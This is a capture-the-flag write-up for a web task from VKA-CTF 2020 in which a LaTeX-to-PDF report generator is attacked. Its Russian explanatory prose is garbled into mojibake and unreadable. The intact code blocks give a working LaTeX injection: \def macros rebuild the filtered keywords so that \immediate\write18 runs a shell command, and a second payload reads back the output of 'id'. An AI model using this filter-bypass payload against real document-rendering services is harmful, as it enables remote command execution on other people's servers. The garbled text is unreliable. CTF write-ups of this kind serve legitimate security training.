## Ð“ÐµÐ½ÐµÑ€Ð°Ñ‚Ð¾Ñ€ Ñ€Ð°Ð¿Ð¾Ñ€Ñ‚Ð¾Ð²

| Ð¡Ð¾Ð±Ñ‹Ñ‚Ð¸Ðµ | ÐÐ°Ð·Ð²Ð°Ð½Ð¸Ðµ | ÐšÐ°Ñ‚ÐµÐ³Ð¾Ñ€Ð¸Ñ | Ð¡Ð»Ð¾Ð¶Ð½Ð¾ÑÑ‚ÑŒ |
|:--------|:---------|:----------|----------:|
| VKA-CTF`2020 | Ð“ÐµÐ½ÐµÑ€Ð°Ñ‚Ð¾Ñ€ Ñ€Ð°Ð¿Ð¾Ñ€Ñ‚Ð¾Ð² | Web | ÐšÐœÐ‘ |

### ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ
> ÐÐ²Ñ‚Ð¾Ñ€: [ ð•‚ð•£ð•’ð•¦ð•¤ð•– ]
>
> \- Ð¢Ð¾Ð²Ð°Ñ€Ð¸Ñ‰ Ð¼Ð°Ð¹Ð¾Ñ€, Ð½Ð°Ð¼ Ð½Ð°Ð´Ð¾ÐµÐ»Ð¾ Ð¿Ð¸ÑÐ°Ñ‚ÑŒ Ñ€Ð°Ð¿Ð¾Ñ€Ñ‚Ð° Ð²Ñ€ÑƒÑ‡Ð½ÑƒÑŽ. Ð Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð½Ð°Ñˆ Ð½Ð¾Ð²Ñ‹Ð¹ [ÑÐµÑ€Ð²Ð¸Ñ](https://generate-pdf.vkactf.tk) Ð´Ð»Ñ ÑÑ‚Ð¾Ð³Ð¾?
>
> \- Ð Ð¾Ð½ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐµÐ½?
>
> \- ÐšÐ¾Ð½ÐµÑ‡Ð½Ð¾, Ð¼Ð¾Ð¶ÐµÑ‚Ðµ ÑÐ°Ð¼Ð¸ Ð¿Ñ€Ð¾Ð²ÐµÑ€Ð¸Ñ‚ÑŒ!

### Ð ÐµÑˆÐµÐ½Ð¸Ðµ

![](imgs/1.PNG)

ÐŸÐµÑ€ÐµÐ´ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¾Ð¹ Ñ‚ÐµÐºÑÑ‚Ð° Ð½Ð° ÑÐµÑ€Ð²ÐµÑ€ Ð¾Ð½ Ð¸Ð·Ð¼ÐµÐ½ÑÐµÑ‚ÑÑ Ð½Ð° ÑÑ‚Ð¾Ñ€Ð¾Ð½Ðµ ÐºÐ»Ð¸ÐµÐ½Ñ‚Ð° (ÑÑ‚Ð¾ Ð¼Ð¾Ð¶Ð½Ð¾ Ð·Ð°Ð¼ÐµÑ‚Ð¸Ñ‚ÑŒ, Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÑ `BurpSuite` Ð¸Ð»Ð¸ Ð½Ð°Ð¹Ð´Ñ Ñ„Ð°Ð¹Ð» `main.js`)

Ð¡Ð¸Ð½Ñ‚Ð°ÐºÑÐ¸Ñ Ð´Ð°Ð½Ð½Ð¾Ð³Ð¾ Ñ‚ÐµÐºÑÑ‚Ð° Ð½Ð°Ð¿Ð¾Ð¼Ð¸Ð½Ð°ÐµÑ‚ LaTeX, Ð° Ð¾Ð½ ÑƒÑÐ·Ð²Ð¸Ð¼ Ðº Ð¿Ñ€Ð¾Ð¸Ð·Ð²Ð¾Ð»ÑŒÐ½Ð¾Ð¼Ñƒ Ñ‡Ñ‚ÐµÐ½Ð¸ÑŽ Ñ„Ð°Ð¹Ð»Ð¾Ð², Ð° Ñ‚Ð°ÐºÐ¶Ðµ Ðº RCE

ÐŸÑ€Ð¾Ð±ÑƒÑ Ð²Ð²ÐµÑÑ‚Ð¸ `input` Ð¸Ð»Ð¸ `include` ÑÐµÑ€Ð²ÐµÑ€ Ð²Ð¼ÐµÑÑ‚Ð¾ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾Ð¹ Ð³ÐµÐ½ÐµÑ€Ð°Ñ†Ð¸Ð¸ PDF Ñ„Ð°Ð¹Ð»Ð° Ð¾Ñ‚Ð²ÐµÑ‡Ð°ÐµÑ‚ `ÐœÐ½Ðµ Ð¿Ð¾ÐºÐ°Ð·Ð°Ð»Ð¾ÑÑŒ?`, Ð° Ð·Ð½Ð°Ñ‡Ð¸Ñ‚ Ð¾Ð½ Ñ„Ð¸Ð»ÑŒÑ‚Ñ€ÑƒÐµÑ‚ ÑÐ¾Ð´ÐµÑ€Ð¶Ð¸Ð¼Ð¾Ðµ Ñ‚ÐµÐºÑÑ‚Ð° Ð¿Ð¾ ÐºÐ»ÑŽÑ‡ÐµÐ²Ñ‹Ð¼ ÑÐ»Ð¾Ð²Ð°Ð¼ (Ð² Ñ‚Ð¾Ð¼ Ñ‡Ð¸ÑÐ»Ðµ Ð¸ `immediate` Ð¸ `write18`, Ð° Ñ‚Ð°ÐºÐ¶Ðµ `loop` Ð¸ `repeate`, Ñ‡Ñ‚Ð¾ Ð·Ð°Ð¿Ñ€ÐµÑ‰Ð°ÐµÑ‚ Ñ‡Ñ‚ÐµÐ½Ð¸Ðµ Ð¼Ð½Ð¾Ð³Ð¾ÑÑ‚Ñ€Ð¾Ñ‡Ð½Ð¾Ð³Ð¾ Ñ„Ð°Ð¹Ð»Ð°)

Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ ÐºÐ¾Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸ÑŽ `/def`, Ñ‡Ñ‚Ð¾Ð±Ñ‹ ÑÐ¾Ð±Ñ€Ð°Ñ‚ÑŒ Ð½Ð°Ñˆ payload "Ð¿Ð¾ ÐºÑƒÑÐ¾Ñ‡ÐºÐ°Ð¼"

```latex
\def \imm {\string\imme}
\def \diate {diate}
\def \eighteen {\string18}
\def \wwrite {\string\write\eighteen}
\def \args {\string{id | base64 > test.tex\string}}
\def \inp {\string\in}
\def \iput {put}
\def \cmd {\string{test.tex\string}}

\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{\imm\diate\wwrite\args\inp\iput\cmd}
\closeout\outfile
```

ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð¸Ð² Ð´Ð°Ð½Ð½ÑƒÑŽ Ð½Ð°Ð³Ñ€ÑƒÐ·ÐºÑƒ Ð¼Ñ‹ ÑÐ¾Ð·Ð´Ð°Ð´Ð¸Ð¼ Ñ„Ð°Ð¹Ð» `cmd.tex` Ñ ÑÐ¾Ð´ÐµÑ€Ð¶Ð¸Ð¼Ñ‹Ð¼
```latex
\immediate\write18{id | base64 > test.tex}\input{test.tex}
```

Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰ÑƒÑŽ Ð½Ð°Ð³Ñ€ÑƒÐ·ÐºÑƒ, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ñ€Ð¾Ñ‡Ð¸Ñ‚Ð°Ñ‚ÑŒ ÑÑ‚Ð¾Ñ‚ Ñ„Ð°Ð¹Ð» Ð¸ Ð¸ÑÐ¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ Ð·Ð°Ð¿Ð¸ÑÐ°Ð½Ð½ÑƒÑŽ Ð² Ð½Ñ‘Ð¼ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñƒ
```latex
\newread\file
\openin\file=cmd.tex
\read\file to\line
\text{\line}
\closein\file
```

Ð”ÐµÐºÐ¾Ð´Ð¸Ñ€ÑƒÐµÐ¼ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ñ‹Ð¹ Ð¾Ñ‚Ð²ÐµÑ‚ Ð¸ Ð¿Ð¾Ð»ÑƒÑ‡Ð°ÐµÐ¼
```bash
uid=1001(pwner) gid=1001(pwner) groups=1001(pwner)
```

Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÑ ÑÑ‚Ð¸ Ð¼ÐµÑ‚Ð¾Ð´Ñ‹ Ð½Ð°Ñ…Ð¾Ð´Ð¸ Ñ„Ð»Ð°Ð³ Ð² ÐºÐ¾Ñ€Ð½Ðµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ

**Ð¤Ð»Ð°Ð³:**

>vka{u53_n0_5h311_35c4p3_1n5734d_0f_814ck1157}